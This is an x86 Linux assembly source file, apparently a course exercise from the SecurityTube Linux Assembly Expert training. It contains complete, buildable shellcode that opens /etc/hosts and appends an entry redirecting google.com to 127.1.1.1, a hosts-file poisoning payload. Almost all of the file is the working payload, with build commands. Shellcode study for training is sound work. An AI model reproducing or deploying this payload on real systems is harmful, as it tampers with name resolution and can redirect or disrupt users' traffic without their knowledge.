; Modified version of shellcode-893
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 ./shellcode-893-modified.nasm -o shellcode-893-modified.o
; ld ./shellcode-893-modified.o -o shellcode-893-modified

global _start

section .text

_start:
    xor eax, eax        ; eax = 0
    cdq                 ; edx = 0
    push byte 5         ; #define __NR_open 5
    pop eax             ; eax = 5
    push edx            ; push null byte
    jmp short _file
_file_load:
    pop ebx             ; ebx = "/etc/hosts"
    mov cx, 0x401       ; permmisions
    int 0x80            ; open file

    xchg eax, ebx       ; store fd in ebx
    push byte 4         ; #define __NR_write 4
    pop eax             ;  
    jmp short _load_data

_write:
    pop ecx             ; ecx = "127.1.1.1 google.com"
    push 0x14           ; length of the string
    pop edx             ; edx = 20
    int 0x80            ; write to file

    push 0x6
    pop eax
    int 0x80            ; close the file

    push 0x1
    pop eax
    int 0x80            ; exit

_load_data:
    call _write
    db "127.1.1.1 google.com"

_file:
    call _file_load
    db "/etc/hosts"
